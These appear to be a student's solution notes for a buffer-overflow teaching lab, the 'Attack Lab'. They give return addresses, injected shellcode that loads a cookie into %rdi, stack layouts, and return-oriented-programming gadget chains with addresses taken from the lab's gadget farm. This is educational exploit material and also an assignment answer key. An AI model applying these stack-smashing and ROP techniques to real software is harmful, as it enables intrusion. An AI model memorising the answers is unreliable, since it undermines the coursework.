## Phase 1

0x401967 --> 0x4017c0

## Phase 2

Set return address of getbuf() to next byte in $rsp, i.e. ($rsp) = $rsp + 8, which point to following instructions:

```
pushq $0x4017ec       # push address of touch2() as return value
movq $0x59b997fa,%rdi # pass cookie to first argument of touch2()
ret                   # return to touch2()
```

```
movq $0x59b997fa,%rdi
ret
```

## Phase 3

byte sequence of string representation of 0x59b997fa is

```
35 39 62 39 39 37 66 61
```

### Solution 1

Stack:

```
+------------------------+
| STRING                 |
|                        |
| INSTRUCTION <<---------------+
|                        |     |
| RETURN1 ---------------------+
+------------------------+
```

Instructions:

```
pushq $0x4018fa
leaq 0x16(%rsp),%rdi
ret
```

### Solution 2

Stack

```
STRING  <--+
           |
leaq 0x16(%rsp),%rdi  <------+
                             |
ADDR2   -> touch3()          |
                             |
ADDR1 -----------------------+
```

Instructions:

```
leaq 0x16(%rsp),%rdi
ret
```

## Phase 4

Stack:

```
touch2()
movl %eax,%edi
0x59b997fa
popq %rax
```

## Phase 5

```
$STRING
touch3()
mov %eax,%edi
lea(%rdi,%rsi,1),%rax
movl %ecx,%esi
movl %edx,%ecx
movl %eax,%edx
$OFFSET
popq %rax
movq %rax,%rdi
movq %rsp,%rax
```

## Reference

In `farm.d`, there are

```
48 8d 04 37	# lea (%rdi,%rsi,1),%rax -> 0x4019d6

89 c7       # movl %eax,%edi         -> 0x4019c6
89 c2       # movl %eax,%edx         -> 0x4019dd
89 ce       # movl %ecx,%esi         -> 0x401a13
89 e0       # movl %esp,%eax
89 d1       # movl %edx,%ecx         -> 0x401a69

48 89 c7    # movq %rax,%rdi         -> 0x4019a2
48 89 e0    # movq %rsp,%rax         -> 0x401aad

58 90       # popq %rax              -> 0x4019ab

20 c0       # andb %al,%al
20 d2       # andb %dl,%dl
20 db       # andb %bl,%bl

84 c0       # testb %al,%al

38 c0       # cmpb %al,%al
38 c9       # cmpb %cl,%cl
38 d2       # cmpb %dl,%dl

08 c9       # orq %cl,%cl
08 db       # orq %bl,%bl
08 d2       # orq %dl,%dl
```
